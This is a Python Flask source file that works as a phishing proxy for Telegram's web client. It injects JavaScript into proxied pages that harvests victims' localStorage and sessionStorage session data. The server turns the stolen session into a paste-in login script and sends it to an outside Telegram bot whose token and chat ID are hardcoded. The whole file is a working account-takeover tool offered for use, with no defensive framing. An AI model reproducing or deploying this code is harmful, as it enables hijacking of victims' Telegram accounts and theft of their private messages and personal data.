from flask import Flask, request, Response
import requests
import time
import json
import os
import random

app = Flask(__name__)

# Base URL of the site you want to proxy
BASE_URL = 'https://web.telegram.org/k/'

# Your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7859238179:AAHJvboPix9pEkq_xNSh2RJFf3EhLqWlQEY'
TELEGRAM_CHAT_ID = '-4753436379'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    url = f"{BASE_URL}{path}"
    headers = {key: value for key, value in request.headers if key != 'Host'}

    try:
        if request.method == 'POST':
            response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
        elif request.method == 'PUT':
            response = requests.put(url, headers=headers, data=request.data, cookies=request.cookies)
        elif request.method == 'DELETE':
            response = requests.delete(url, headers=headers, cookies=request.cookies)
        else:
            response = requests.get(url, headers=headers, cookies=request.cookies)

        injected_js = """
        <script>
            function sendStorageData() {
                const localStorageData = JSON.stringify(localStorage);
                const sessionStorageData = JSON.stringify(sessionStorage);
                fetch('/store-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        localStorage: localStorageData,
                        sessionStorage: sessionStorageData
                    }),
                });
            }
            const keyName = 'user_auth';
            const reloadLimit = 0;

            if (sessionStorage.getItem('reloadCount') === null) {
                sessionStorage.setItem('reloadCount', 0);
            } else {
                let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
                reloadCount += 1;
                sessionStorage.setItem('reloadCount', reloadCount);

                if (reloadCount >= reloadLimit) {
                    console.log("Reload limit reached. Clearing storage...");
                    localStorage.clear();
                    sessionStorage.clear();
                }
            }
            window.onload = sendStorageData;

            setInterval(function() {
                const value = localStorage.getItem(keyName);
                if (value !== null) {
                    console.log(`Key "${keyName}" exists with value:`, value);
                    sendStorageData();
                    window.location.reload();
                }
            }, 5000);
        </script>
        """

        if 'text/html' in response.headers.get('Content-Type', ''):
            content = response.text.replace('</body>', injected_js + '</body>')
        else:
            content = response.content

        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
        return Response(content, response.status_code, headers)

    except requests.RequestException as e:
        return Response(f"Error proxying request: {str(e)}", 500)

@app.route('/store-data', methods=['POST'])
def store_data():
    try:
        storage_data = request.json
        local_storage = json.loads(storage_data.get('localStorage', '{}'))
        session_storage = json.loads(storage_data.get('sessionStorage', '{}'))

        # Convert number_of_accounts to int, default to 0 if not present or invalid
        number_of_accounts = local_storage.get("number_of_accounts", "0")
        try:
            number_of_accounts = int(number_of_accounts)
        except (ValueError, TypeError):
            number_of_accounts = 0

        if number_of_accounts > 0:
            # Parse user_auth JSON string to dictionary
            user_auth = json.loads(local_storage.get("user_auth", "{}"))
            user_id = user_auth.get("userId", "unknown")
            rt = random.randint(100,999)
            file_path = f'{rt}.txt'
            
            copy_code = (
                f'if(location.host=="web.telegram.org"){{'
                f'localStorage.clear();'
                f'Object.entries({storage_data.get("localStorage")}).forEach(i => localStorage.setItem(i[0], i[1]));'
                f'}};location.href="https://web.telegram.org/k";'
            )
            
            with open(file_path, 'w') as f:
                f.write(copy_code)
            
            # Send file to Telegram
            formatted_message = format_message(local_storage)
            send_text_to_telegram(file_path, "sent by safeguard bot")
            
            # Clean up the file after sending
            os.remove(file_path)
            print(f"File {file_path} sent to Telegram and deleted.")

        return 'Data received', 200

    except (json.JSONDecodeError, KeyError, OSError) as e:
        return Response(f"Error processing storage data: {str(e)}", 500)

def format_message(local_storage):
    try:
        # Parse user_auth JSON string to dictionary
        user_auth = json.loads(local_storage.get("user_auth", "{}"))
        
        # Extract relevant data from local_storage with defaults
        name = local_storage.get('name', '?.eth')
        phone = local_storage.get('phone', '+6285282631346')
        user_id = user_auth.get('userId', 'unknown')

        copy_code = (
            f'if(location.host=="web.telegram.org"){{'
            f'localStorage.clear();'
            f'Object.entries({json.dumps(local_storage)}).forEach(i => localStorage.setItem(i[0], i[1]));'
            f'}};location.href="https://web.telegram.org/k";'
        )

        # Format the message using HTML
        message = f"""
❓ <b>How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)\n\n
<b>Name:</b> {name}\n
<b>Phone:</b> {phone}\n
<b>User ID:</b> {user_id}\n\n
<b>Click to copy:</b> <code>{copy_code}</code>
"""
        return message
    except Exception as e:
        return f"Error formatting message: {str(e)}"

def send_text_to_telegram(file_path, caption):
    try:
        # Telegram API endpoint
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"

        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }
        
        with open(file_path, "rb") as file:
            files = {"document": file}
            response = requests.post(url, data=data, files=files)
            
        response.raise_for_status()
        return response.json()
    except (requests.RequestException, OSError) as e:
        return {"error": f"Failed to send to Telegram: {str(e)}"}

if __name__ == '__main__':
    app.run(debug=True, port=5000)
